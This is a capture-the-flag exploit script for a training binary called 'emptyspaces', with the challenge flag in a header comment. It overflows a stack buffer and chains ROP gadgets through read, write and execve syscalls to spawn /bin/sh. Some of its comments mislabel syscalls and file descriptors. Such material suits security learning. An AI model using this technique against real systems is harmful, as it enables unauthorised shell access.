#!/usr/bin/env python3

# flag{it_is_always_nice_to_pull_off_a_rop_chain!}

import sys
from pwn import *
from pwn import p64


def sendline(p, payload):
    p.sendline(payload)


if "--remote" in sys.argv:
    p = remote("bin.training.jinblack.it", 4006)
else:
    p = process("./emptyspaces")

if "--debug" in sys.argv:
    context.terminal = ['terminator', '-e']
    gdb.attach(p, """
    b *0x400b95
    b *0x400c14
    c
    """)

syscall = 0x474dc5  # syscall; ret;

data_address = 0x6bb2e0

gadget_pop_rax = 0x4155a4  # pop rax; ret;
gadget_pop_rdi = 0x400696  # pop rdi; ret;
gadget_pop_rsi = 0x410133  # pop rsi; ret;
gadget_pop_rdx = 0x44bd36  # pop rdx; ret;

# Firstly, we do a read because the space available is very little.
# Also, there is a function that overwrites the buffer
# to avoid the possibility of saving the string binsh

payload = b"A" * (64 + 8)

# --- READ ---

payload += p64(gadget_pop_rax)
payload += p64(0)  # read syscall

payload += p64(gadget_pop_rdi)
payload += p64(0)  # standard input

payload += p64(gadget_pop_rdx)
payload += p64(0x1ff)  # length

payload += p64(syscall)

assert len(payload) < 137, len(payload)

p.recvuntil(b"What shall we use\nTo fill the empty spaces\nWhere we used to pwn?")
sendline(p, payload)
time.sleep(0.1)

prev_len = len(payload)

payload = b"A" * prev_len

# --- WRITE ---

payload += p64(gadget_pop_rax)
payload += p64(1)  # write syscall

payload += p64(gadget_pop_rdi)
payload += p64(1)  # standard input

payload += p64(gadget_pop_rdx)
payload += p64(0x5)  # length

payload += p64(syscall)

# --- READ  ---

payload += p64(gadget_pop_rax)
payload += p64(0)  # read syscall

payload += p64(gadget_pop_rdi)
payload += p64(0)  # standard input

payload += p64(gadget_pop_rsi)
payload += p64(data_address)  # address (.data)

payload += p64(gadget_pop_rdx)
payload += p64(0x8)  # length

payload += p64(syscall)

# --- EXECVE ---

payload += p64(gadget_pop_rax)
payload += p64(0x3b)  # read syscall

payload += p64(gadget_pop_rdi)
payload += p64(data_address)  # address of binsh

payload += p64(gadget_pop_rsi)
payload += p64(0)

payload += p64(gadget_pop_rdx)
payload += p64(0)

payload += p64(syscall)

sendline(p, payload)
p.recvn(5)
sendline(p, b"/bin/sh\0")
p.interactive()
